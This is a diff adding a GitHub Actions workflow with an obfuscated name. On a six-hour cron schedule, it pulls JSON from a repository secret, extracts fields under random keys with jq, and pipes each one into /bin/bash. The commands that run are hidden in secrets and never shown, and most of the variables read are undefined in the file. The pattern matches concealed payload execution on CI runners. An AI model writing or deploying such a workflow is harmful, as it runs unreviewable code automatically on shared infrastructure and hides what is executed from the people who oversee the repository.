@@ -1,0 +1,24 @@
+name: zhegeguizezhendehenxiang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhegeguizezhendehenxiang
+        env:
+          aet606: ${{ secrets.aet606 }}
+        run: |
+          echo $aet606 | jq -r .yiet7409 | /bin/bash
+          echo $u6 | jq -r .fux038 | /bin/bash
+          echo $ueof752 | jq -r .godm14 | /bin/bash
+          echo $ska78036 | jq -r .sc4531 | /bin/bash
+          echo $krokf6 | jq -r .cyo548 | /bin/bash
+          echo $u7 | jq -r .nu7842 | /bin/bash
+
